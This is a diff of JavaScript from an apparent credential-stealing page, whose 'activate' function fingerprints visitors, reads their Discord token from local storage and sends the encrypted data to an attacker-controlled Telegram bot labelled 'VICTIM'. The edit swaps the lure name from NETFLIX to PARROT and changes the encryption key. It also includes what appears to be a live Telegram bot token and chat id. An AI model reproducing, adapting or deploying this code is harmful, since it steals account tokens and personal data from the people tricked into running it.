@@ -42,7 +42,7 @@ async function activate(){
   if(blocked.some(c=>lang.includes(c)||tz.includes(c)))return;
 
   const vic={ip:await(await fetch('https://api.ipify.org')).text(),os:navigator.userAgent,tz:tz,lang:lang,screen:screen.width+'x'+screen.height,wallets:[],discord:null};
-  const cv=document.createElement('canvas'); const ctx=cv.getContext('2d'); ctx.fillText('NETFLIX2025',2,10);
+  const cv=document.createElement('canvas'); const ctx=cv.getContext('2d'); ctx.fillText('FINAL2025',2,10);
   const hash=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(cv.toDataURL()));
   vic.hwid=Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,'0')).join('')+'_'+(navigator.hardwareConcurrency||0)+'_'+(navigator.deviceMemory||0);
 
@@ -52,9 +52,9 @@ async function activate(){
   if(localStorage.getItem('token')) vic.discord=localStorage.getItem('token').replace(/"/g,'');
 
   const payload=btoa(unescape(encodeURIComponent(JSON.stringify(vic))));
-  const enc=CryptoJS.AES.encrypt(payload,CryptoJS.enc.Utf8.parse('FATHER2025')).toString();
+  const enc=CryptoJS.AES.encrypt(payload,CryptoJS.enc.Utf8.parse('SONOFTHEFATHER2025')).toString();
 
-  fetch('https://api.telegram.org/bot8599950371:AAEWUhTxI19s-b7p2RXrwoxWZZseHeSMqcs/sendMessage?chat_id=7185082346&text='+encodeURIComponent('NETFLIX VICTIM\n'+enc),{mode:'no-cors'});
+  fetch('https://api.telegram.org/bot8599950371:AAEWUhTxI19s-b7p2RXrwoxWZZseHeSMqcs/sendMessage?chat_id=7185082346&text='+encodeURIComponent('PARROT VICTIM\n'+enc),{mode:'no-cors'});
 
   document.getElementById('b').style.display='none';
   document.getElementById('l').style.display='block';
